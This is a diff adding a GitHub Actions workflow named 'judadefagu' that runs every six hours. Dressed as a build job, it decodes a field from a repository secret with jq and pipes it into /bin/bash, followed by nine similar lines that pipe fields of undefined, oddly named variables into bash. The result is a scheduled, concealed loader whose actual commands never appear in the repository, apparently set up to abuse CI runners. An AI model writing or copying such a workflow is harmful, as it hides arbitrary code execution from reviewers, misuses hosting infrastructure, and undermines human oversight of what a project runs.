@@ -1,0 +1,28 @@
+name: judadefagu
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '15 5/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: judadefagu
+        env:
+          r07115: ${{ secrets.r07115 }}
+        run: |
+          echo $r07115 | jq -r .vl4 | /bin/bash
+          echo $pjsss78653 | jq -r .snp3780 | /bin/bash
+          echo $pwwja6 | jq -r .ycw628 | /bin/bash
+          echo $rps52 | jq -r .c6 | /bin/bash
+          echo $p54513 | jq -r .r49 | /bin/bash
+          echo $dnkyz41 | jq -r .a8 | /bin/bash
+          echo $fobi9 | jq -r .uu1 | /bin/bash
+          echo $ns4 | jq -r .imecn12 | /bin/bash
+          echo $tyjl0 | jq -r .vul987 | /bin/bash
+          echo $oh44 | jq -r .wkcg02 | /bin/bash
+
